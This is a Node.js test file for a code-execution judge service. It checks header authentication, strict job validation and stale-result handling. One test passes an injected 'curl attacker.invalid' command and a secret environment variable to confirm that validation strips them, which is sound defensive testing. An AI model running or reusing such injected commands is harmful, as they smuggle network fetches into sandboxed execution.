import test from 'node:test';
import assert from 'node:assert/strict';
import {authorized,validate,publicResult,result,STALE_MS} from '../lib/protocol.mjs';
const input=()=>({source_code:Buffer.from('print(1)').toString('base64'),stdin:'',language_id:71,cpu_time_limit:2,wall_time_limit:6,memory_limit:262144,enable_network:false});
test('authentication fails closed, including unconfigured and repeated headers',()=>{
 assert.equal(authorized(undefined,undefined),false);
 assert.equal(authorized('short','short'),false);
 assert.equal(authorized(['x'.repeat(32)],'x'.repeat(32)),false);
 assert.equal(authorized('x'.repeat(32),'x'.repeat(32)),true);
 assert.equal(authorized('y'.repeat(32),'x'.repeat(32)),false);
});
test('strict input validation strips arbitrary execution options',()=>{
 const job=validate({...input(),command:'curl attacker.invalid',env:{SECRET:'x'}});
 assert.equal(job.source,'print(1)');
 assert.equal(job.command,undefined);
 for(const change of [{language_id:99},{cpu_time_limit:11},{cpu_time_limit:NaN},{wall_time_limit:31},{memory_limit:0},{enable_network:true},{source_code:'%%%'}]) assert.throws(()=>validate({...input(),...change}));
});
test('lost work becomes Judge Error, completed records do not expire early',()=>{
 assert.equal(publicResult({createdAt:0,result:result(1)},'t',STALE_MS+1).status.id,13);
 assert.equal(publicResult({createdAt:0,result:result(3)},'t',STALE_MS+1).status.id,3);
 assert.equal(publicResult(null,'t').status.id,13);
});
